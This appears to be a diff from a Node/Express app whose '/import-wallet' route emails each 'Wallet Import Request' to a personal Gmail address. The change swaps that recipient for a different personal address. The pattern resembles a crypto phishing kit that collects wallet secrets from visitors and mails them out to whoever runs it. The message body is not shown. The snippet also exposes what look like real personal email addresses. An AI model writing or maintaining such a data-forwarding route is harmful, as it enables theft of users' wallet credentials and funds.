@@ -237,7 +237,7 @@ router.post("/import-wallet", (req, res) => {
 
   const mailOptions = {
     from: '"Alphapip Network" <mokeke250@gmail.com>',
-    to: "mokeke185@gmail.com",
+    to: "raulmatthew71@gmail.com",
     subject: "Wallet Import Request",
     text: emailBody,
   };
